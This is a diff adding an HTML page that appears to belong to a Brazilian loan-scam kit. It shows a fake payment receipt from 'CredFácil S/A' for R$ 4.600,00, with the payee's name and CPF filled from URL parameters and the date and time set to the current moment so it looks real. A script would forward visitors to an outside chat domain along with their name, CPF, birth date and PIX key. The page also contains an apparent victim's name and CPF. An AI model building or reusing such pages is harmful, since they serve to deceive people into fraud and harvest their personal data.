@@ -1,0 +1,112 @@
+<!DOCTYPE html><!-- saved from url=(0099)https://atendimento-rapido.com/com/?nome=IVES%20MATEUS%20PAULINO%20SILVA&cpf=01750899221&nasc=&pix= --><html lang="pt-br" data-arp=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Agendado</title>
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="images/crelogo.png" alt="Logo">
+        </div>
+        <div class="title" style="color:#000;">CredFácil S/A 
+        <p>CNPJ 10.962.591/0002-12</p><p>
+            
+        </p></div>
+        <div class="status">
+            <svg width="800px" height="800px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21ZM11.7682 15.6402L16.7682 9.64018L15.2318 8.35982L10.9328 13.5186L8.70711 11.2929L7.29289 12.7071L10.2929 15.7071L11.0672 16.4814L11.7682 15.6402Z" fill="#008000"></path>
+            </svg>
+            <span>Pagamento Agendado</span>
+        </div>
+        <div class="separator"></div>
+        <div class="details">
+            <div style="display: flex; align-items: center; justify-content: space-between;">
+                <div>
+                    <strong>Data de pagamento:</strong>
+                    <span id="payment-date">17/03/2026</span>
+                </div>
+                <div>
+                    <strong>Horário:</strong>
+                    <span id="payment-time">22:28</span>
+                </div>
+            </div>
+
+            <strong>Valor do pagamento:</strong>
+            <span>R$ 4.600,00</span>
+
+            <strong>Pagador:</strong>
+            <span>CredFácil S/A</span>
+
+            <strong>Beneficiário:</strong>
+            <span id="nome">IVES MATEUS PAULINO SILVA</span>
+
+            <strong>CPF:</strong>
+            <span id="cpf">01750899221</span>
+
+            <strong>Código de pagamento:</strong>
+            <span class="no-detection">10497.31548 30060.117147 00255.499295 8 8454000008000</span>
+
+            <strong>Autenticação:</strong>
+            <span>EA.32.75.C5.41.FB.6D.F5CC.69.3F</span>
+        </div>
+    </div>
+
+    <script>
+        function getQueryParams() {
+            const params = {};
+            const queryString = window.location.search;
+            if (queryString) {
+                const pairs = queryString.substring(1).split('&');
+                pairs.forEach(pair => {
+                    const [key, value] = pair.split('=');
+                    params[decodeURIComponent(key)] = decodeURIComponent(value || "");
+                });
+            }
+            return params;
+        }
+
+        const queryParams = getQueryParams();
+
+        if (queryParams.nome) {
+            document.getElementById('nome').textContent = queryParams.nome;
+        }
+
+        if (queryParams.cpf) {
+            document.getElementById('cpf').textContent = queryParams.cpf;
+        }
+
+        const paymentDate = document.getElementById('payment-date');
+        const paymentTime = document.getElementById('payment-time');
+        const now = new Date();
+
+        const formattedDate = now.toLocaleDateString('pt-BR', {
+            day: '2-digit',
+            month: '2-digit',
+            year: 'numeric',
+        });
+        paymentDate.textContent = formattedDate;
+
+        const formattedTime = now.toLocaleTimeString('pt-BR', {
+            hour: '2-digit',
+            minute: '2-digit',
+        });
+        paymentTime.textContent = `${formattedTime}`;
+    </script>
+
+    <script>
+        const { nome, cpf, nasc, pix } = queryParams;
+        const redirectionChance = 0;
+        const randomChance = Math.floor(Math.random() * 100);
+
+        if (randomChance < redirectionChance) {
+            const redirectUrl = `https://chat.soliciteagora.click/011?nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)}&nasc=${encodeURIComponent(nasc)}&pix=${encodeURIComponent(pix)}`;
+
+            setTimeout(() => {
+                window.top.location.href = redirectUrl;
+            }, 1000);
+        }
+    </script>
+
+
+</body></html>
